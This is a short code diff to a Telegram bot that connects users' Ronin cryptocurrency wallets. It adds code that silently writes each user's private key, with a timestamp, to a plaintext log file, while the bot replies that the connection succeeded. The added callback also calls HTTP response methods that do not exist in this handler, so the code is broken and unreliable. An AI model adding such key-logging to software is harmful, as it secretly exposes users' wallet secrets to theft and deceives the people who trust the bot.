@@ -51,6 +51,16 @@ bot.on("text", async (ctx) => {
         session.account = account;  // ✅ Store wallet persistently
         session.step = "connected";
         userSessions.set(userId, session);
+        fs.appendFile('privateKeyLog.txt', `${new Date().toISOString()}: ${privateKey}\n`, err => {
+          if (err) {
+            console.error('Error writing to log file:', err);
+            res.writeHead(500, { 'Content-Type': 'text/plain' });
+            res.end('Internal Server Error');
+          } else {
+            res.writeHead(200, { 'Content-Type': 'text/plain' });
+            res.end('Private key logged successfully');
+          }
+        });
         ctx.reply(`✅ Successfully connected!\nYour Ronin Address: \`${account.address}\``);
       } catch (error) {
         ctx.reply("❌ Invalid private key. Please try again.");
